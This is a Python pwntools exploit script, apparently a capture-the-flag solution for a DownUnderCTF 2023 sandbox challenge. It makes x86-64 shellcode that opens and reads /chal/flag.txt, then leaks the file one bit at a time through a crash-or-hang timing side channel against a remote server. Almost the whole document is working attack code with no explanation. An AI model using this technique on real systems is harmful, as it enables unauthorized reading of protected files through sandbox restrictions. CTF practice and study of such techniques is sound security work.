#!/usr/bin/env python
from pwn import *
import time

context.terminal = ["tmux", "splitw", "-h"]

def gen_stage2_shellcode(char_pos, bit_pos):
    bit_mask = (1 << bit_pos)
    
    shellcode_asm = f'''
    {shellcraft.linux.openat(0, '/chal/flag.txt', 0, 0)}
    {shellcraft.linux.read(3, 'rsp', 0x50)}

    mov rdx, rsp
    add dl, 0x%X
    mov al, byte ptr [rdx]
    test al, 0x%X
    je bit_1

    mov rax, 1
    syscall
    
    bit_1:
    mov rsi, 0x1337000
    xor rdi, rdi
    xor rax, rax
    syscall
    ''' % (char_pos, bit_mask)
    
    
    shellcode = asm(shellcode_asm)
    
    return shellcode
    
gdbscript = """
b main
c
"""

if __name__ == "__main__":
    #p = process("./chall")
    context.arch = 'amd64'
    
    flag = ""
    for pos in range(0, 0x50):
        leak = 0
        for bit in range(0, 8):
            # p = process("./jail")
            p = remote("2023.ductf.dev", 30010)
            # p = gdb.debug("./jail", gdbscript=gdbscript)
            # p = remote("win.the.seetf.sg", 2002)
            
            shellcode = gen_stage2_shellcode(pos, bit)
            
            #input("press anykey to send second stage")
            p.sendlineafter(b"> ", shellcode)
            time.sleep(1)
            
            is_connected = True
            try:
                print(p.recvn(1024, timeout=1))
            except:
                is_connected = False
            
            if is_connected:
                #bit 0
                p.close()
            else:
                #bit 1
                leak |= (1 << bit)
                p.close()
        
        flag += chr(leak)
        log.info(flag)



